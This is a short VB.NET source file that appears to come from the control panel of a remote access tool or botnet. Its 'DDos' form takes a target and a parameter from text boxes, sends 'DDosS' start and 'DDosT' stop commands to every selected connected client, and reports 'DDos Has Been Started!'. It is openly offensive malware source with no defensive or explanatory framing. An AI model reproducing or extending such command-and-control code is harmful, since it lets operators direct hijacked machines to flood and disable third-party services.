Public Class DDos
    Private Sub DDos_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Label2.ForeColor = Color.White
        Label2.Text = "[" & Form1.Lv1.SelectedItems.Count & "]"
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Try
            Dim B As Byte() = SB("DDosS" & Settings.SPL & TextBox3.Text & Settings.SPL & TextBox1.Text)
            For Each C As ListViewItem In Form1.Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next
            Label2.ForeColor = Color.Green
            MessageBox.Show("DDos Has Been Started!")
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Try
            Dim B As Byte() = SB("DDosT")
            For Each C As ListViewItem In Form1.Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next
            Label2.ForeColor = Color.Red
            MessageBox.Show("DDos Has Been Stopped!")
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub
End Class